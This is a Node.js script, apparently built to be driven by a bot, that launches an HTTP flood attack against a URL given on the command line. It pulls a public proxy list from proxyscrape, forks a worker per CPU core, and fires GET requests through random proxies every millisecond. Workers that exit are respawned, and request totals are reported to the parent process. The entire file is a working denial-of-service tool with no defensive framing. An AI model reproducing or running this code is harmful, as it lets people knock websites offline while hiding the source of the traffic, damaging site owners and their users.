const http = require('node:http');
const https = require('node:https');
const cluster = require('node:cluster');
const os = require('node:os');

const target = process.argv[2];
const numCPUs = os.cpus().length;

if (cluster.isPrimary) {
    let totalRequests = 0;

    // Ambil Proxy
    async function getProxies() {
        return new Promise((resolve) => {
            https.get(`https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all`, (res) => {
                let data = '';
                res.on('data', (c) => data += c);
                res.on('end', () => resolve(data.split(/\r?\n/).filter(l => l.includes(':'))));
            }).on('error', () => resolve([]));
        });
    }

    getProxies().then(proxies => {
        for (let i = 0; i < numCPUs; i++) {
            cluster.fork().send({ type: 'init', proxies });
        }
    });

    // Kirim Log ke Bot (IPC)
    cluster.on('message', (worker, msg) => {
        if (msg.type === 'count') {
            totalRequests += msg.value;
            if (process.send) {
                process.send({ type: 'log', total: totalRequests, target: target });
            }
        }
    });

    cluster.on('exit', () => cluster.fork());
} else {
    let list = [];
    process.on('message', (m) => { if(m.type === 'init') list = m.proxies; });

    function flood() {
        if (list.length === 0) return;
        const proxy = list[Math.floor(Math.random() * list.length)];
        const [h, p] = proxy.split(':');
        const isHttps = target.startsWith('https');
        const agent = isHttps ? new https.Agent({ keepAlive: true }) : new http.Agent({ keepAlive: true });

        const req = (isHttps ? https : http).request({
            host: h, port: p, path: target, method: 'GET', agent: agent,
            headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
        }, (res) => {
            process.send({ type: 'count', value: 1 });
            res.on('data', () => {});
            res.on('end', () => req.destroy());
        });
        req.on('error', () => req.destroy());
        req.end();
    }
    setInterval(flood, 1);
}

